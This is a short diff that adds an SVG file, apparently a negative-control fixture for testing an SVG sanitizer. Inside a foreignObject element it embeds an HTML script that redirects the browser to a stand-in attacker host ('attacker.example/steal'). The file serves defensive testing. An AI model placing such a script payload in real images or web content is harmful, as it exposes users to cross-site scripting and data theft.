@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200">
+  <title>Security Negative Control: ForeignObject Script</title>
+  <!-- Dangerous foreignObject embedding HTML script payload -->
+  <foreignObject width="200" height="200">
+    <div xmlns="http://www.w3.org/1999/xhtml">
+      <p>Embedded HTML</p>
+      <script>
+        window.location = 'http://attacker.example/steal';
+      </script>
+    </div>
+  </foreignObject>
+</svg>
